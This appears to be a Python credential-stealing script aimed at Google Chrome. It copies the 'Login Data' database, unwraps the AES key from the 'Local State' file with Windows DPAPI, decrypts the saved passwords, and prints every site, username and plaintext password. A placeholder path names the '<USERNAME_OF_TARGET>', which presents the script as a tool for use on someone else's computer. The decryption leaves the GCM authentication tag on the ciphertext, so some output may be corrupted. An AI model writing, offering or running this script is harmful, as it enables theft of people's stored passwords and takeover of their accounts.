import sqlite3
import win32crypt
import json
import base64
from Cryptodome.Cipher import AES

# Function to extract encrypted login data from the Chrome "Login Data" file
def extract_encrypted_data(db_path):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()
        conn.close()
        return logins
    except sqlite3.OperationalError as e:
        print(f"Error accessing the database: {e}")
        return []

# Function to decrypt passwords using AES
def decrypt_aes(encrypted_data, key):
    try:
        iv = encrypted_data[3:15]  # Extract the IV (first 12 bytes after the "v10" prefix)
        ciphertext = encrypted_data[15:]  # Extract the ciphertext
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(ciphertext)
        
        # Try decoding as UTF-8; if it fails, try other encodings or return raw bytes
        try:
            return decrypted_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                return decrypted_data.decode("latin-1")  # Try Latin-1 encoding
            except UnicodeDecodeError:
                return decrypted_data  # Return raw bytes if decoding fails
    except Exception as e:
        print(f"AES decryption failed: {e}")
        return None

# Main script
if __name__ == "__main__":
    # Path to the Chrome "Login Data" file
    db_path = r"C:\<PATH_TO_FILE>\Chrome_LoginData_Backup"

    # Path to the Local State file
    local_state_path = r"C:\Users\<USERNAME_OF_TARGET>\AppData\Local\Google\Chrome\User Data\Local State"

    # Extract encrypted login data
    logins = extract_encrypted_data(db_path)

    if not logins:
        print("No login data found or unable to access the database.")
    else:
        # Read the Local State file to get the AES key
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove the "DPAPI" prefix
        aes_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        # Decrypt and print the AES-encrypted passwords
        for login in logins:
            url, username, encrypted_password = login
            if not url or not username:  # Skip entries with empty URL or username
                continue
            if encrypted_password.startswith(b"v10"):  # Check if AES encrypted
                decrypted_password = decrypt_aes(encrypted_password, aes_key)
                if decrypted_password:
                    print(f"URL: {url}, Username: {username}, Password: {decrypted_password}")
